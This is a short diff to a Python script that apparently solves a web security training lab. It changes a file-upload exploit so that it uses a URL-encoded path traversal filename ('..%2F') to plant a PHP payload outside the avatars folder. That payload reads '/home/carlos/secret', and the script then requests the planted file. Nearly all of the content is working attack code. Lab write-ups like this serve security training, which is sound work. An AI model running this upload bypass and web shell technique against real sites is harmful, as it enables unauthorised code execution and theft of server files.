@@ -1,4 +1,4 @@
-# Lab: Web shell upload via Content-Type restriction bypass
+# Lab: Web shell upload via path traversal
 
 import requests
 import re
@@ -64,7 +64,7 @@ def upload_file(csrf_token):
     # }
 
     file = {
-        'avatar': ('file_upload.php', '<?php echo file_get_contents("/home/carlos/secret") ?>','text/php'),
+        'avatar': ('..%2Ffile_upload.php', '<?php echo file_get_contents("/home/carlos/secret") ?>','text/php'),
         'user': (None, 'wiener', None),
         'csrf': (None, csrf_token, None)
     }
@@ -78,7 +78,7 @@ def upload_file(csrf_token):
         sys.exit(0)
     
     # Execute the file by the get request
-    url = target_url + "/files/avatars/file_upload.php"
+    url = target_url + "/files/file_upload.php"
 
     out = r.get(url, verify=False, proxies=proxies)
     if out.status_code == 200:
